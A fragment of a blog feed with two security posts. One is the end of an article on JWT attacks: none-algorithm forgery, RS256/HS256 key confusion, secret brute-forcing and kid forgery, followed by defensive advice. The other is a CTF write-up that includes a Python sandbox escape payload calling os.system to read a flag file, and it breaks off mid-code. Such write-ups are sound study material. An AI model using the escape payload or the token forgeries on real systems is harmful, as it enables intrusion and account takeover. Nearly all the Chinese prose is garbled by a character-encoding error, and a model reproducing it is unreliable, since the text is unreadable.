class="line"><span class="keyword">catch</span>(err) &#123;res.send(<span class="string">"your JWT is :&lt;br&gt;"</span>+req.cookies.jwt)&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Example app listening on port 3000!'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Example app listening on port 3000!'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>Êé®ËçêÂá†‰∏™Âú®Á∫øÂ∑•ÂÖ∑<ul><li><a href="https://jwt.io" target="_blank" rel="noopener">https://jwt.io</a> </li><li>by Sjoerd Langkemper<ul><li>ÊîØÊåÅ <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php" target="_blank" rel="noopener">hs256</a> ÁÆóÊ≥ï</li><li>ÊîØÊåÅ <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php" target="_blank" rel="noopener">rs256</a> ÁÆóÊ≥ï</li></ul></li><li>by Kenji Urushima <ul><li>ÊîØÊåÅÊõ¥Â§öÁÆóÊ≥ï  <a href="https://kjur.github.io/jsjws/tool_jwt.html" target="_blank" rel="noopener">kjur/jsjws</a>  </li></ul></li></ul></li></ul><h1 id="0x03-ÊîªÂáªÈù¢"><a href="#0x03-ÊîªÂáªÈù¢" class="headerlink" title="0x03 ÊîªÂáªÈù¢"></a>0x03 ÊîªÂáªÈù¢</h1><h2 id="ÂèëÁé∞ÊïèÊÑü‰ø°ÊÅØ"><a href="#ÂèëÁé∞ÊïèÊÑü‰ø°ÊÅØ" class="headerlink" title="ÂèëÁé∞ÊïèÊÑü‰ø°ÊÅØ"></a>ÂèëÁé∞ÊïèÊÑü‰ø°ÊÅØ</h2><p>JWT‰∏≠ÁöÑ<code>header</code> Âíå <code>payload</code> ËôΩÁÑ∂ÁúãËµ∑Êù•‰∏çÂèØËØªÔºå‰ΩÜÂÆûÈôÖ‰∏äÈÉΩÂè™ÁªèËøáÁÆÄÂçïÁºñÁ†ÅÔºåÂºÄÂèëËÄÖÂèØËÉΩËØØÂ∞ÜÊïèÊÑü‰ø°ÊÅØÂ≠òÂÇ®Âú®ÈáåÈù¢„ÄÇ‰ΩøÁî®‰∏äËø∞Â∑•ÂÖ∑ÂèØ‰ª•Êñπ‰æøÂú∞Ëß£Á†ÅJWT‰∏≠Ââç‰∏§ÈÉ®ÂàÜÁöÑ‰ø°ÊÅØ„ÄÇ</p><h2 id="ÊåáÂÆöÁÆóÊ≥ï‰∏∫none"><a href="#ÊåáÂÆöÁÆóÊ≥ï‰∏∫none" class="headerlink" title="ÊåáÂÆöÁÆóÊ≥ï‰∏∫none"></a>ÊåáÂÆöÁÆóÊ≥ï‰∏∫none</h2><p>‰∏äÈù¢ÊèêÂà∞ÁÆóÊ≥ï <code>none</code> ÊòØJWTËßÑËåÉ‰∏≠Âº∫Âà∂Ë¶ÅÊ±ÇÂÆûÁé∞ÁöÑÔºå‰ΩÜÊúâ‰∫õÂÆûÁé∞JWTÁöÑÂ∫ìÁõ¥Êé•Â∞Ü‰ΩøÁî®<code>none</code> ÁÆóÊ≥ïÁöÑtokenËßÜ‰∏∫Â∑≤ÁªèËøáÊ†°È™å„ÄÇËøôÊ†∑ÊîªÂáªËÄÖÂ∞±ÂèØ‰ª•ËÆæÁΩÆ<code>alg</code> ‰∏∫<code>none</code> Ôºå‰Ωø<code>signature</code> ÈÉ®ÂàÜ‰∏∫Á©∫ÔºåÁÑ∂ÂêéÊûÑÈÄ†ÂåÖÂê´‰ªªÊÑè<code>payload</code> ÁöÑJWTÊù•Ê¨∫È™óÊúçÂä°Á´Ø„ÄÇ</p><p><img src="1525158849660.png" alt="1525158849660"></p><h2 id="Â∞ÜÁ≠æÂêçÁÆóÊ≥ï‰ªéÈùûÂØπÁß∞Á±ªÂûãÊîπ‰∏∫ÂØπÁß∞Á±ªÂûã"><a href="#Â∞ÜÁ≠æÂêçÁÆóÊ≥ï‰ªéÈùûÂØπÁß∞Á±ªÂûãÊîπ‰∏∫ÂØπÁß∞Á±ªÂûã" class="headerlink" title="Â∞ÜÁ≠æÂêçÁÆóÊ≥ï‰ªéÈùûÂØπÁß∞Á±ªÂûãÊîπ‰∏∫ÂØπÁß∞Á±ªÂûã"></a>Â∞ÜÁ≠æÂêçÁÆóÊ≥ï‰ªéÈùûÂØπÁß∞Á±ªÂûãÊîπ‰∏∫ÂØπÁß∞Á±ªÂûã</h2><p>‰ΩøÁî®ÈùûÂØπÁß∞Âä†ÂØÜÁÆóÊ≥ïÔºà‰∏ªË¶ÅÂü∫‰∫éRSA„ÄÅECDSAÔºåÂ¶ÇS256ÔºâÂàÜÂèëJWTÁöÑËøáÁ®ãÊòØ‰ΩøÁî®ÁßÅÈí•ÔºàprivateÔºâÂä†ÂØÜÁîüÊàêJWTÔºå‰ΩøÁî®ÂÖ¨Èí•ÔºàpublicÔºâËß£ÂØÜÈ™åËØÅ„ÄÇ</p><p>‰ΩøÁî®ÂØπÁß∞Âä†ÂØÜÁÆóÊ≥ïÔºà‰∏ªË¶ÅÂü∫‰∫éHMACÔºåÂ¶ÇHS256ÔºâÂàÜÂèëJWTÁöÑËøáÁ®ãÊòØ‰ΩøÁî®Âêå‰∏Ä‰∏™ÂØÜÈí•ÔºàsecretÔºâÁîüÊàêÂíåÈ™åËØÅJWT„ÄÇ</p><p>Â¶ÇÊûúÊúçÂä°Á´ØÊúüÂæÖÊî∂Âà∞ÁöÑÁÆóÊ≥ïÁ±ªÂûã‰∏∫RS256ÔºåÁÑ∂Âêé‰ª•RS256ÂíåpublicÂéªÈ™åËØÅJWTÔºåËÄåÂÆûÈôÖ‰∏äÊî∂Âà∞ÁöÑÁÆóÊ≥ïÁ±ªÂûãÊòØHS256ÔºåÈÇ£‰πàÊúçÂä°Á´ØÂ∞±ÂèØËÉΩÂ∞ùËØïÊääpublicÂΩì‰ΩúsecretÔºåÁÑ∂ÂêéÁî®HS256ÁÆóÊ≥ïËß£ÂØÜÈ™åËØÅJWT„ÄÇ</p><p>Áî±‰∫éRS256ÁöÑpublic‰∫∫‰∫∫ÈÉΩÂèØËé∑ÂæóÔºåÊîªÂáªËÄÖÂèØ‰ª•È¢ÑÂÖà‰ª•public‰∏∫ÂØÜÈí•ÔºåÁî®HS256ÁÆóÊ≥ï‰º™ÈÄ†ÂåÖÂê´‰ªªÊÑè<code>payload</code> ÁöÑJWTÔºå‰ªéËÄåÊàêÂäüÈÄöËøáÊúçÂä°Á´ØÁöÑÈ™åËØÅ„ÄÇ</p><p><img src="1525160523495.png" alt="1525160523495"></p><h2 id="ÁàÜÁ†¥ÂØÜÈí•"><a href="#ÁàÜÁ†¥ÂØÜÈí•" class="headerlink" title="ÁàÜÁ†¥ÂØÜÈí•"></a>ÁàÜÁ†¥ÂØÜÈí•</h2><p>JWTÁöÑÂÆâÂÖ®ÊÄß‰æùËµñ‰∫éÂØÜÈí•ÁöÑ‰øùÂØÜÊÄßÔºå‰ªª‰ΩïÊã•ÊúâÂØÜÈí•ÁöÑ‰∫∫ÈÉΩÂèØ‰ª•ÊûÑÈÄ†‰ªª‰ΩïÂÜÖÂÆπÁöÑÂêàÊ≥ïtoken„ÄÇ</p><p>ÂΩì‰∏Ä‰∏™JSON Web Token Ë¢´ÂàÜÂèëÂá∫ÂéªÔºåÂ¶ÇÊûúÂØÜÈí•‰∏çÂ§üÂº∫Â£ÆÂ∞±Â≠òÂú®Ë¢´ÁàÜÁ†¥ÁöÑÈ£éÈô©ÔºåËÄå‰∏îÊï¥‰∏™ÁàÜÁ†¥ËøáÁ®ãÂèØ‰ª•Á¶ªÁ∫øËøõË°å„ÄÇ</p><p>Â∑≤ÁªèÊúâ‰∫∫ÂÜô‰∫Ü‰∏Ä‰∫õÂ∑•ÂÖ∑ÔºåÊé®ËçêÂ¶Ç‰∏ãÔºö</p><ul><li><a href="https://github.com/jmaxxz/jwtbrute" target="_blank" rel="noopener">jwtbrute</a> </li><li><a href="https://github.com/Sjord/jwtcrack/blob/master/crackjwt.py" target="_blank" rel="noopener">Sjord‚Äô python script</a> </li><li><a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">John the Ripper</a> </li></ul><h2 id="‰º™ÈÄ†ÂØÜÈí•"><a href="#‰º™ÈÄ†ÂØÜÈí•" class="headerlink" title="‰º™ÈÄ†ÂØÜÈí•"></a>‰º™ÈÄ†ÂØÜÈí•</h2><p>ÊúâÊó∂JWTÈááÁî®<code>header</code> ‰∏≠ÁöÑ<code>kid</code> Â≠óÊÆµÂÖ≥ËÅîÊ†°È™åÁÆóÊ≥ïÁöÑÂØÜÈí•ÔºåËøô‰∏™ÂØÜÈí•ÂèØËÉΩÊòØÂØπÁß∞Âä†ÂØÜÁöÑÂØÜÈí•Ôºå‰πüÂèØËÉΩÊòØÈùûÂØπÁß∞Âä†ÂØÜÁöÑÂÖ¨Èí•„ÄÇÂ¶ÇÊûúËÉΩÂ§üÁåúÊµã<code>kid</code> Âíå ÂØÜÈí•ÁöÑÂÖ≥ËÅîÊÄßÔºåÊîªÂáªËÄÖÂ∞±ÂèØËÉΩ‰øÆÊîπ<code>kid</code> Êù•Ê¨∫È™óÊúçÂä°Á´ØÔºå‰ΩøÂÖ∂Ê†°È™åÊó∂‰ΩøÁî®ÊîªÂáªËÄÖÂèØÊéßÁöÑÂØÜÈí•Ôºå‰∫éÊòØÊîªÂáªËÄÖÂ∞±ÂèØ‰ª•‰º™ÈÄ†‰ªªÊÑèÂÜÖÂÆπÁöÑÂèØÈÄöËøáÊ†°È™åÁöÑJWT„ÄÇ</p><h3 id="2017-HITB-Pasty"><a href="#2017-HITB-Pasty" class="headerlink" title="2017 HITB Pasty"></a>2017 HITB Pasty</h3><p>ÂÖ≥ËÅîÊÄßÔºökidÊòØÂØÜÈí•URIÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇ</p><p><img src="1525359586004.png" alt="from cnblogs.com/dliv3/p/7450057.html"></p><h3 id="2018Âº∫ÁΩëÊùØ-easyweb"><a href="#2018Âº∫ÁΩëÊùØ-easyweb" class="headerlink" title="2018Âº∫ÁΩëÊùØ easyweb"></a>2018Âº∫ÁΩëÊùØ easyweb</h3><p>ÂÖ≥ËÅîÊÄßÔºökid Â∏¶ÂÖ•Êï∞ÊçÆÂ∫ìÊü•ËØ¢ÂØπÂ∫îÂØÜÈí•ÔºåÂèØËÅîÂêàÊü•ËØ¢ÊàñËÄÖÁõ≤Ê≥®„ÄÇ</p><p>ËØ¶ËßÅ <a href="http://findneo.github.io/180430ciscn/#easyweb">http://findneo.github.io/180430ciscn/#easyweb</a></p><h1 id="0x04-ÂÆâÂÖ®Âª∫ËÆÆ"><a href="#0x04-ÂÆâÂÖ®Âª∫ËÆÆ" class="headerlink" title="0x04 ÂÆâÂÖ®Âª∫ËÆÆ"></a>0x04 ÂÆâÂÖ®Âª∫ËÆÆ</h1><ul><li>È™åËØÅÂáΩÊï∞Â∫îÂøΩÁï•JWT‰∏≠ÁöÑ<code>algo</code> Â≠óÊÆµÔºåÈ¢ÑÂÖàÂ∞±ÊòéÁ°ÆJWT‰ΩøÁî®ÁöÑÁÆóÊ≥ïÔºåÂ¶ÇÊûúÈúÄË¶Å‰ΩøÁî®Â§öÁßçÁÆóÊ≥ïÔºåÂèØ‰ª•Âú®<code>header</code> ‰∏≠‰ΩøÁî®Ë°®Á§∫‚Äùkey ID‚Äù ÁöÑ<code>kid</code> Â≠óÊÆµÔºåÊü•ËØ¢ÊØè‰∏™<code>kid</code> ÂØπÂ∫îÁöÑÁÆóÊ≥ï„ÄÇ</li><li>JWT/JWS Ê†áÂáÜÂ∫îËØ•ÁßªÈô§ <code>header</code> ‰∏≠ÁöÑ<code>algo</code> Â≠óÊÆµ„ÄÇJWTÁöÑËÆ∏Â§öÂÆâÂÖ®Áº∫Èô∑ÈÉΩÊù•Ëá™‰∫éÂºÄÂèëËÄÖ‰æùËµñËøô‰∏ÄÂÆ¢Êà∑Á´ØÂèØÊéßÁöÑÂ≠óÊÆµ„ÄÇ</li><li>ÂºÄÂèëËÄÖÂ∫îÂçáÁ∫ßÁõ∏Â∫îÂ∫ìÂà∞ÊúÄÊñ∞ÁâàÊú¨ÔºåÂõ†‰∏∫ÊóßÁâàÊú¨ÂèØËÉΩÂ≠òÂú®Ëá¥ÂëΩÁº∫Èô∑„ÄÇ</li></ul><h1 id="0x05-ÂèÇËÄÉÊñáÁ´†"><a href="#0x05-ÂèÇËÄÉÊñáÁ´†" class="headerlink" title="0x05 ÂèÇËÄÉÊñáÁ´†"></a>0x05 ÂèÇËÄÉÊñáÁ´†</h1><ul><li><a href="https://jwt.io/introduction/" target="_blank" rel="noopener">https://jwt.io/introduction/</a></li><li><a href="https://www.cnblogs.com/anny0404/p/5318692.html" target="_blank" rel="noopener">https://www.cnblogs.com/anny0404/p/5318692.html</a></li><li><a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/" target="_blank" rel="noopener">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</a></li><li><a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" target="_blank" rel="noopener">https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Êú¨ÊñáÈ¶ñÂèë  &lt;a href=&quot;http://www.freebuf.com/column/170359.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Freebuf&lt;/a&gt;   „ÄÇÁï•ÊúâÊõ¥Êñ∞„ÄÇ&lt;/strong&gt;  &lt;/p&gt;
&lt;h1 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Á¨¨ÂçÅ‰∏ÄÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõ‚ÄúÂàõÊñ∞ÂÆûË∑µËÉΩÂäõËµõ‚Äù</title>
    <link href="https://findneo.github.io/180430ciscn/"/>
    <id>https://findneo.github.io/180430ciscn/</id>
    <published>2018-04-29T19:43:05.000Z</published>
    <updated>2019-01-25T23:21:36.981Z</updated>
    
    <content type="html"><![CDATA[<p>ÂÖ®ÈÉ®ËµõÈ¢òÔºö<a href="https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn" target="_blank" rel="noopener">https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn</a></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><blockquote><p><a href="http://114.116.26.217/" target="_blank" rel="noopener">http://114.116.26.217/</a></p></blockquote><p>Â≠¶‰π†‰∫Ü‰∏ÄÁÇπ json web token Ôºå‰ΩÜÊòØÊ≤°ÊÉ≥Âà∞ÊòØ‰∏™ËÑëÊ¥û„ÄÇÔºàÂ∫îËØ•Âè™ÊòØÈùûÈ¢ÑÊúüËß£Ôºâ</p><p>Ë¥¶Êà∑adminÔºåÁ©∫ÂØÜÁ†ÅÁôªÈôÜ„ÄÇ</p><p><code>ciscn{2a36b5f78a1d6a107212d82ee133c421}</code></p><p><img src="1525025826358.png" alt="1525025826358"></p><p><img src="1525025838819.png" alt="1525025838819"></p><p>ÊúâÂ∏àÂÇÖÂú®Áæ§ÈáåËØ¥HMACÁöÑÂØÜÈí•ÊîæÂú®Êï∞ÊçÆÂ∫ìÈáåÔºåËÄåkidÊòØ‰∏™Ê≥®ÂÖ•ÁÇπÔºåÂèØ‰ª•ÈÄöËøáËÅîÂêàÊü•ËØ¢ÊéßÂà∂Êü•ËØ¢ÁªìÊûúÔºåÁÑ∂Âêé‰º™ÈÄ†Á≠æÂêç„ÄÇ</p><p>‰ªéÂºÄÂßãÂÅöÂà∞ËµõÂêéËØïÁùÄÂ§çÁé∞ÈÉΩ‰∏ÄÁõ¥Á∫†Áªì<code>alg</code> ÊòØsha256ÁöÑÈóÆÈ¢òÔºå‰ª•‰∏∫ÂØÜÈí•ÊòØÁî®Êù•Âä†ÁõêÔºåÁÑ∂ÂêéÂ∞±Ëá™Â∑±ËÉ°‰π±Âä†ÁõêÔºåÈô∑ÂÖ•Âõ∞Â¢É„ÄÇÂêéÊù•‰ªîÁªÜ‰∫ÜËß£‰∫Ü‰∏Ä‰∏ãÔºåHMACÂ∞±ÁÆóÊòØ‰∏Ä‰∏™ÊØîËæÉÂ§çÊùÇÁöÑÂä†ÁõêÁÆóÊ≥ïÂêßÔºåËá™Â∑±Âä†Ê≤°Âï•ÊÑèÊÄùÔºåËÄå‰∏îjwt‰πü‰∏çÊîØÊåÅÁ∫ØÁ≤πsha256„ÄÇ</p><p>‰∫ãÂÆûËØÅÊòéÊääsha256ÊîπÊàêHS256Â∞±Â•Ω‰∫Ü„ÄÇËøôÈáåÊúâ‰∏§ÁßçÂèØËÉΩÔºå‰∏ÄÊòØÂêéÁ´ØÂÜôÊ≠ªÁÆóÊ≥ï‰∏∫HS256ÔºåÁÑ∂ÂêéheaderÈáåÈù¢ÂÜôÊàê‰∫Üsha256Ôºå‰∫åÊòØÁÆóÊ≥ïÊ†πÊçÆ<code>alg</code> ÁöÑÂÄºÁ°ÆÂÆöÔºåÊàë‰ª¨‰º†ÂÖ•HS256ÊâÄ‰ª•ÊåâÁÖßHS256Êù•ËÆ°ÁÆó„ÄÇ</p><p>ÁªèËøáÊµãËØïÂèëÁé∞ÂêéÁ´ØÁîöËá≥Ê†πÊú¨‰∏çÂú®‰πéÊúâÊ≤°<code>alg</code> ÔºåÔºåÔºåÔºåÊâÄ‰ª•ËØ¥ÂÅöÈ¢òÊÄùË∑ØËøòÊòØË¶ÅÁÅµÊ¥ª‰∏Ä‰∫õ„ÄÇ</p><p>kidÁöÑÂÄºÈöèÊÑè‰º†ÔºåÂ•áÊÄ™‰∏ÄÁÇπÂ∞±Ë°åÔºåÂè™Ë¶ÅËÆ©ÂÆÉÊü•ËØ¢‰∏çÂá∫ÁªìÊûúÔºåÈÇ£‰πàÊàë‰ª¨ËÅîÂêàÊü•ËØ¢ÁöÑÂÄºÂ∞±‰ºö‰Ωú‰∏∫ÊúÄÂêéÁöÑÂØÜÈí•„ÄÇ</p><p><img src="1527354162506.png" alt="1527354162506"></p><p>ÂèÇËÄÉÔºö</p><ul><li><a href="https://www.jianshu.com/p/e64d96b4a54d" target="_blank" rel="noopener">https://www.jianshu.com/p/e64d96b4a54d</a></li><li><a href="https://security.stackexchange.com/questions/79577/whats-the-difference-between-hmac-sha256key-data-and-sha256key-data" target="_blank" rel="noopener">https://security.stackexchange.com/questions/79577/whats-the-difference-between-hmac-sha256key-data-and-sha256key-data</a></li><li><a href="https://docs.python.org/2/library/hmac.html" target="_blank" rel="noopener">https://docs.python.org/2/library/hmac.html</a></li></ul><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="È™åËØÅÁ†Å"><a href="#È™åËØÅÁ†Å" class="headerlink" title="È™åËØÅÁ†Å"></a>È™åËØÅÁ†Å</h2><blockquote><p>Êú¨È¢òÁõÆ‰∏∫È™åËØÅÁ†ÅÁ†¥Ëß£ÔºåÈÄâÊâãÈúÄÂú®ÊåáÂÆöÊó∂Èó¥ÂÆåÊàêÂØπÈ™åËØÅÁ†ÅÁöÑÁ†¥Ëß£ÔºåÊàêÂäüÂêéËé∑ÂèñFlag„ÄÇËØ∑‰ΩøÁî®Èòü‰ºçtokenËøõË°åÁôªÈôÜ„ÄÇ<br>ÂèÇËÄÉÊï∞ÊçÆÔºö<a href="https://share.weiyun.com/6e055fc3402e86c7cbb5384f1a6b41b8" target="_blank" rel="noopener">https://share.weiyun.com/6e055fc3402e86c7cbb5384f1a6b41b8</a></p><p><a href="https://game.captcha.qq.com/hslj/html/hslj/" target="_blank" rel="noopener">https://game.captcha.qq.com/hslj/html/hslj/</a></p></blockquote><p>È¢òÁõÆÊúâÁÇπÈóÆÈ¢òÔºåÊâãÂä®Áé©‰∫Ü‰∏Ä‰ºöÂÑø„ÄÇ</p><p><code>ciscn{12qiftb1qj12mbzm1xmjd2iix2ibqz7i}</code></p><p><img src="1524887059191.png" alt="1524887059191"> </p><p>ÂêéÊù•Êç¢ÊàêËæìÈ™åËØÅÁ†ÅÂæóflag‰∫Ü„ÄÇ</p><p><img src="1525027778352.png" alt="1525027778352"></p><h2 id="picture"><a href="#picture" class="headerlink" title="picture"></a>picture</h2><blockquote><p>ËØ∑‰ªéÂõæ‰∏≠ÊâæÂá∫ÂØÜÁ†Å„ÄÇ</p><p><img src="task_ctf_08_354M5YB.png" alt="ÈôÑ‰ª∂‰∏ãËΩΩ"> </p></blockquote><p><code>binwalk -e</code> ÂàÜÁ¶ªÂæóÂà∞ <code>97E4</code> Âíå <code>97E4.zlib</code> ‰∏§‰∏™Êñá‰ª∂ÔºåÂêéËÄÖÊòØÂâçËÄÖÁöÑ zlib ÂéãÁº©Êñá‰ª∂„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">print</span> zlib.decompress(open(<span class="string">'97E4.zlib'</span>,<span class="string">'rb'</span>).read())==open(<span class="string">'97E4'</span>,<span class="string">'rb'</span>).read() </span><br><span class="line"><span class="comment"># got True</span></span><br></pre></td></tr></table></figure><p>Êñá‰ª∂<code>97E4</code> ÂÜÖÂÆπÁöÑbase64Ëß£Á†ÅÂêéÁ®çÂÅöÂ§ÑÁêÜÊòØ‰∏Ä‰∏™Âä†ÂØÜÁöÑÂéãÁº©ÂåÖ„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">t=open(<span class="string">'97E4'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">m=base64.b64decode(t).encode(<span class="string">"hex"</span>)</span><br><span class="line">n=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)/<span class="number">4</span>):</span><br><span class="line">n+=m[i*<span class="number">4</span>+<span class="number">2</span>:i*<span class="number">4</span>+<span class="number">4</span>]+m[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">2</span>]</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"><span class="comment"># 504b040300140001000030904c97542e7f25005a0000004e0000000400006f6365647ab0d6a3f3bbc8060511ce0c8b62793d8d39caf2b644325509c991cb202dc981e60ea354ca8de79f3bc187f6719f4738adf24fa3ca2d9d7b8adda175d833d1c0264225c62d86784977cf5973989ea77ddbbf31060aef47124fca4b500201003f00140001000030904c97542e7f25005a0000004e00000004002400000000000000200000000000006f636564000a002000000000000100189800e452da8501d3bcf6ace5da8701d3bcf6ace5da8701d34b500605000000000001000100560000007c000000dc505b74796f68206e2e325d370a0d3e3e203e7da87da87da80a0d0a0d7254636162656361206b6d28736f207465726563746e63206c61206c616c74733a290a0d20206946656c2220703c737965686c6c3023223e202c696c656e3120202c6e693c206f6d7564656c0d3e200a2020a820a87da87d0d7d5a0a7265446f766973696f69456e7272726f203a7da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da83c20202d617073736f7764723b200d293e0a3e3e0020</span></span><br></pre></td></tr></table></figure><p>Â§ßËá¥ÂÜÖÂÆπÂ¶Ç‰∏ãÔºö</p><p><img src="1525026681311.png" alt="1525026681311"></p><p>ÂØπÊØîÂæóÂà∞ÂØÜÁ†ÅÔºö <code>integer division or modulo by zero</code> </p><p><img src="1525026721625.png" alt="1525026721625"></p><p>ÂæóÂà∞‰∏Ä‰∏≤ÁºñÁ†ÅÂêéÂ≠óÁ¨¶Ôºö</p><p><img src="1525026922897.png" alt="1525026922897"></p><p>Ëß£Á†ÅÂæóÂà∞ <code>CISCN{C16E6F6E065DA0306E318D095C68BDC0}</code> </p><p><img src="1525026880755.png" alt="1525026880755"></p><h2 id="run"><a href="#run" class="headerlink" title="run"></a>run</h2><p>ÂèÇËÄÉÈìæÊé•Ôºö</p><ul><li><a href="http://cauc.me/2017/11/16/python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">http://cauc.me/2017/11/16/python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/</a></li><li><a href="https://blog.csdn.net/qq_35078631/article/details/78504415" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/78504415</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="keyword">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ca'</span>+<span class="string">'t'</span>+<span class="string">' /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'</span>)</span><br><span class="line"><span class="comment"># ciscn&#123;db87226edc7f9aff82a6b524053eef9e&#125;</span></span><br></pre></td></tr></table></figure><p><img src="1525027473718.png" alt="1525027473718"></p><p>È°∫‰æødump‰∏ãÊù•Âá†‰∏™Êñá‰ª∂</p><p><img src="1525027583658.png" alt="1525027583658"></p><p>cpython.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> pythonapi,POINTER,py_object</span><br><span class="line"></span><br><span class="line">_get_dict = pythonapi._PyObject_GetDictPtr</span><br><span class="line">_get_dict.restype = POINTER(py_object)</span><br><span class="line">_get_dict.argtypes = [py_object]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> pythonapi,POINTER,py_object</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dict</span><span class="params">(ob)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> _get_dict(ob).contents.value</span><br></pre></td></tr></table></figure><p>sandbox.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-04-09 23:30:58</span></span><br><span class="line"><span class="comment"># @Author  : Xu (you@example.org)</span></span><br><span class="line"><span class="comment"># @Link    : https://xuccc.github.io/</span></span><br><span class="line"><span class="comment"># @Version : $Id$</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line"><span class="keyword">from</span> cpython <span class="keyword">import</span> get_dict</span><br><span class="line"><span class="keyword">from</span> types <span 